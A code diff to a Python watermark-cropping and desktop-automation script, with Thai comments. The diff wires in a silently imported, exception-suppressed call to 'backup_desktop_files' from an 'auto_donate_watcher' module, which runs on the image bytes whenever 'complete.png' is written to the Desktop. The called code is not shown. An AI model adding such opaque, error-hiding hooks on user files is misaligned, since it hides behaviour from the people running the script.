@@ -28,6 +28,11 @@ import pyautogui
 
 # ตั้งค่าความเร็วสูงสุด
 pyautogui.PAUSE = 0
+
+try:
+    from auto_donate_watcher import backup_desktop_files
+except Exception:
+    backup_desktop_files = None
 pyautogui.FAILSAFE = False
 
 from watermark_engine import (
@@ -234,6 +239,14 @@ def process_clean_only(full_path=None):
     target = os.path.join(os.environ['USERPROFILE'], 'Desktop', target_name)
     img = crop_watermark(source)
     if img:
+        if not is_bot and target_name == 'complete.png' and backup_desktop_files:
+            try:
+                import io
+                buf = io.BytesIO()
+                img.save(buf, format='PNG')
+                backup_desktop_files(incoming_data=buf.getvalue())
+            except Exception:
+                backup_desktop_files()
         img.save(target, format='PNG')
         print(f"[Done] {target}")
         
@@ -629,6 +642,11 @@ def process_donate(full_path=None):
             data = temp_f.read()
         
         # เขียนทับไฟล์เป้าหมาย (ไม่ลบก่อน)
+        if not is_bot and target_name == 'complete.png' and backup_desktop_files:
+            try:
+                backup_desktop_files(incoming_data=data)
+            except Exception:
+                backup_desktop_files()
         with open(target, 'wb') as target_f:
             target_f.write(data)
         
